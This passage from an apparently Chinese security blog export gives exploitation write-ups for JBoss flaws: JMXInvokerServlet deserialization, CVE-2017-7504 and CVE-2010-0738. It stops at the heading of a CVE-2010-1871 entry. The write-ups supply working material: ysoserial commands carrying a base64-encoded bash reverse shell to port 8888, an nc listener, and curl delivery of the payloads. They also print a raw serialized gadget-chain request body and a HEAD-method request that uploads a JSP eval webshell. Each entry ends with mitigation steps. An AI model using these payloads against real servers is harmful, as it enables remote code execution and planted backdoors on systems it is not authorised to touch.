<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>

<p>HTTP头部抓包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/JMXInvokerServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li><p>删除<code>http-invoker.sar</code>组件</p>
</li>
<li><p>设置<code>http-invoker</code></p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>升级JBoss版本</p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss MQ JMS 反序列化漏洞 - CVE-2017-7504</title>
    <url>//0d8902f8e415.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>JBoss AS 4.x</code> 及之前版本中， <code>JbossMQ</code> 实现过程的 <code>JMS over HTTP Invocation Layer</code> 的 <code>HTTPServerILServlet.java</code> ⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<ul>
<li>&lt;= JBoss AS 4.x</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下URL</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jbossmq-httpil/HTTPServerILServlet</span><br></pre></td></tr></table></figure>

<p>如果返回<code>This is the JBossMQ HTTP-IL</code>，则存在此漏洞</p>
<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>下载JavaDeserH2HC工具</p>
<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<code>ysoserial.jar</code>工具</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>

<p>HTTP头部抓包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jbossmq-httpil/HTTPServerILServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>升级JBoss版本</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss JMX控制台安全验证绕过漏洞 - CVE-2010-0738</title>
    <url>//3a334b8ad7cb.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        JXM控制台配置仅指定了对于<code>GET</code>和<code>POST</code>请求的限制，入侵者可以通过<code>HEAD</code>等方式提交特制的HTTP请求以绕过身份验证并访问受限信息</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<ul>
<li>JBoss 4.2.x</li>
<li>JBoss 4.3.x</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p><strong>访问如下URL</strong></p>
<p>当设置了登录验证，以下地址限制<code>GET</code>和<code>POST</code>方式访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>

<p>这里我们通过其他的HTTP方法使用<code>jboss.admin -&gt; DeploymentFileRepository -&gt; store()</code>方法</p>
<p>通过抓包将<code>POST</code>方法改成<code>HEAD</code>，并将传参移动到URL处</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HEAD /jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodIndex=0&amp;arg0=shell2.war&amp;arg1=shell&amp;arg2=.jsp&amp;arg3=%3C%25eval%20request%28%22admin%22%29%25%3E&amp;arg4=True HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br></pre></td></tr></table></figure>

<p>以上代码的URL处不要轻易修改，比如空格，回车，会导致格式错误</p>
<p><code>arg3</code>的内容为<code>&lt;%eval request(&quot;admin&quot;)%&gt;</code>通过<code>Escape</code>加密之后得到的值</p>
<p>直接传参会导致报错，上传失败</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在上述代码中禁止所有方法访问，而不是仅为<code>GET</code>和<code>POST</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>升级JBoss版本</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>JBoss</category>
      </categories>
      <tags>
        <tag>访问控制错误漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss seam2模板注入漏洞 - CVE-2010-1871</title>
    <url>//73208a942d69.html</url>
